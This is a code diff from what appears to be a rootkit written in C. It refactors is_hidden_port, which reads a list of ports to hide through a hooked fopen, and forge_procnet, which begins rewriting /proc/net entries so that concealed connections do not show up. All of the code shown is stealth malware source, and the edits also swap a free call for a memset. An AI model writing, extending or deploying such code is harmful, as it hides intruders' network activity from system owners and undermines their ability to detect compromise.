@@ -1,13 +1,13 @@
 int is_hidden_port(int port){
     FILE *fp;
-    char buf[LINE_MAX], *buf_tok = NULL;
+    char buf[128], *buf_tok = NULL;
     int hidden_status = 0,
         low_port,
         high_port;
 
     hook(CFOPEN);
-    if((fp = call(CFOPEN, HIDEPORTS, "r")) == NULL)
-        return 0;
+    fp = call(CFOPEN, HIDEPORTS, "r");
+    if(fp == NULL) return 0;
 
     while(fgets(buf, sizeof(buf), fp) != NULL){
         buf[strlen(buf) - 1] = '\0';
@@ -33,13 +33,13 @@ int is_hidden_port(int port){
         }
     }
 
-    if(buf_tok) free(buf_tok);
+    memset(buf, 0, strlen(buf));
     fclose(fp);
     return hidden_status;
 }
 
 FILE *forge_procnet(const char *pathname){
-    FILE *tmp, *pnt;
+    FILE *tmp = tmpfile(), *pnt;
     char line[LINE_MAX], raddr[128],
          laddr[128], etc[128];
     unsigned long rxq, txq, t_len,
@@ -49,8 +49,9 @@ FILE *forge_procnet(const char *pathname){
         tout;
 
     hook(CFOPEN);
-    if((pnt = call(CFOPEN, pathname, "r")) == NULL) return NULL;
-    if((tmp = tmpfile()) == NULL) return pnt;
+    pnt = call(CFOPEN, pathname, "r");
+    if(pnt == NULL) return NULL;
+    if(tmp == NULL) return pnt;
 
     char *fmt = "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n";
     /* begin reading entries from said procnet file */
